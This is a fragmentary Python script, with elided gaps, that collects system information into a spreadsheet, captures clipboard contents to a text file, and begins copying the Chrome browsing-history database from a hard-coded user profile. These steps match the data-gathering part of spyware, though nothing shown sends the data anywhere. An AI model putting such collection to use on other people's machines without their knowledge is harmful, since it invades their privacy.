...
import pandas as pd  # manipulate with the acquired data
import shutil  # copy files safely
...
# gets the computer information and store it in excel file
...
def copy_clipboard():
    ...
    with open("clipboard.txt", "a") as f:
        try:
            ...
            f.write("\nClipboard not available: " + str(e) + "\n")


copy_clipboard()

# get history of google chrome (copy file first to avoid lock errors)

history_path = r"C:\Users\juwai\AppData\Local\Google\Chrome\User Data\Default\History"
temp_history = "History_copy"

# Copy the original history database to a temporary file
